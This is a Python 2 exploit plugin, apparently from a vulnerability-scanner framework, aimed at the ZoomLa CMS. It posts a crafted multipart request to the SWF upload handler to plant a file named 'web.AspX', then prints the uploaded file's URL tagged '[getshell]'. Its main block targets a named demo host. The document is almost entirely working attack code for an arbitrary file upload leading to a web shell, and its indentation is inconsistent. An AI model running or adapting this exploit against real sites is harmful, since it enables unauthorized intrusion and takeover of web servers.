#!/usr/bin/python

def assign(service, arg):
    if service == "zoomla":
        return True, arg

def audit(arg):
    raw = '''POST /Plugins/swfFileUpload/UploadHandler.ashx HTTP/1.1
Host: 192.168.0.115
Content-Length: 205
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
Content-Type: Multipart/form-data; boundary=----WebKitFormBoundaryzBAT1pn7EI6xFqBr
Accept-Language: zh-CN,zh;q=0.8

------WebKitFormBoundaryzBAT1pn7EI6xFqBr
Content-Disposition: form-data; name="Filedata"; filename="web.AspX"
Content-Type: application/x-config

123456789
------WebKitFormBoundaryzBAT1pn7EI6xFqBr--
'''
    url = arg + 'Plugins/swfFileUpload/UploadHandler.ashx'
    code, head,res, errcode, _ = curl.curl2(url, raw=raw)
    if res.endswith('.AspX'):
    	shell = arg +"uploadfiles/"+res
        print shell+'[getshell]'
        return shell

if __name__ == '__main__':
    from dummy import *
    audit(assign('zoomla', 'http://demo.zoomla.cn/')[1]) 


def test(url):
    sys.stdout.write("Target:"+url+"                                    \r")
    sys.stdout.flush()
    return audit(assign(__name__, url)[1]) 